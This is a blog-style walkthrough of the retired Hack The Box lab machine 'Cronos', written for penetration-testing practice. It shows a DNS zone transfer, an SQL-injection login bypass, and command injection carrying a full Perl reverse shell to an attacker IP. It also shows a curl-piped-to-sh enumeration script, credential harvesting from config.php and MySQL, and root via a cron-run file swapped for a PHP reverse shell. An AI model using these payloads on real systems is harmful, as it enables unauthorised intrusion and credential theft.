---
layout: post
title: "Cronos"
date: 2020-02-16 18:22:00 +0000
categories: HTB-Walkthrough
---

![cronos](/assets/img/cronos.png)

One of my favourite boxes this one...

`nmap -sV -Pn --min-rate 10000 |tee -a cronos.txt`

```

Nmap scan report for 10.10.10.13
Host is up (0.094s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

We see port 53 running, lets enumerate it...


<h3>Domain Enumeration</h3>

```

root@kali:~/HTB/retired/cronos# nslookup
> server 10.10.10.13
Default server: 10.10.10.13
Address: 10.10.10.13#53
> 10.10.10.13
13.10.10.10.in-addr.arpa        name = ns1.cronos.htb.

```

We can add cronos.htb to our /etc/hosts file.

Lets dig a little deeper...

`dig -axfr cronos.htb @10.10.10.13`

```

; <<>> DiG 9.11.5-P4-5.1+b1-Debian <<>> axfr cronos.htb @10.10.10.13
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 92 msec
;; SERVER: 10.10.10.13#53(10.10.10.13)
;; WHEN: Fri Jan 24 20:42:44 EST 2020
;; XFR size: 7 records (messages 1, bytes 203)

```

lets take a look now at http://admin.cronos.htb

Its a login page...
We can try some well known weak credentials, they fail so lets try sqli login bypass

In the username field type 

```

admin 'or 1=1# 

```

sometimes blank password is ok, sometimes random input is required.
Splendid, this gets us into the tracert webpage....we can try to inject commands here....

use ; to add command after the ping one; for example:

```

8.8.8.8;perl -e 'use Socket;$i="10.10.14.19";$p=6969;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

```

the perl reverse shell works! we catch the reverse shell on 
`nc -nlvp 6969`

##########################


<h3>Privilege Escalation</h3>

Taking a look around we know there's always goodies in the config.php file if its available...

```

$ cat config.php                                                                                                   
<?php                                                                                                              
   define('DB_SERVER', 'localhost');                                                                               
   define('DB_USERNAME', 'admin');                                                                                 
   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');                                                                   
   define('DB_DATABASE', 'admin');                                                                                 
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE); 

```

This may be very useful, we can check the mysql database to see if we can find any other creds.

```

$ mysql -u admin -p
Enter password: kEjdbRigfBHUREiNSDs
use admin  
;
show tables;
select * from users;
quit
Tables_in_admin
users
id      username        password
1       admin   4f5fffa7b2340178a716e3832451e058
$ 

```

[g0tmi1k's linux privilege escalation guide is the Bible of linux enum](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/),

one of the first commands I always run (after `sudo -l` and `sudo su`) is
`find / -perm -u=s -type f 2>/dev/null`

```

find / -perm -u=s -type f 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/fusermount
/bin/su
/bin/ntfs-3g
/bin/ping6
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/at
/usr/bin/pkexec
/usr/bin/newgidmap
/usr/bin/gpasswd
/usr/bin/passwd

```

Its important to become well practiced in the techniqes, methods and commands g0tmilk covers. For convenience many folk suppliment this knowlege with using enumeration scripts.
Theres a few good ones out there, [LinEnum.sh](https://github.com/rebootuser/LinEnum) is a good comprehensive one, but the one ive started using first recently is [linpeas.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)

We can use curl (when available on targets) to run the enumeration from our attacking machine.

```

curl 10.10.14.19/linpeas.sh |sh |tee -a enum.txt

```

...so we dont even upload the file to the target...neat trick...

Whilst increasingly becomming my goto method of enum, when the conditions allow, its not actually needed here; the way forward is practically right in front of us.

In /var/www/laravel there is an interesting file called 'artisan'.
Looking at our enum.txt output from linpeas.sh we find that cronjob run by root executes it.

our wwwdata user has write privileges in the www folder, so we can replace with evil.php get rootshell....
the php reverse shell can be downloaded from pentestmonkey's website, but its also available in /usr/share/webshells/
we just need to modify the lhost and port settings.

There's a few ways we can get the file to the target... we can copy'n'paste it into vi, we can use `wget` or `curl -O`

```

root@kali:~/HTB/retired/cronos# nc -nlvp 31337
listening on [any] 31337 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.13] 56894
Linux cronos 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 04:38:01 up  2:55,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=0(root) gid=0(root) groups=0(root)
/bin/sh: 0: can't access tty; job control turned off
# cat /home/*/user.txt
51xxxxxxxxxxxxxxxxxxxxxxxxxxxx3b
# cat /root/root.txt
1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxa0

```

##########################

Exploiting suid files to escalate privileges is an important technique to practice and remember to look out for,
it will often be the best (and sometimes only) way to get root. 
[Check out this article for a good explaination](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/)
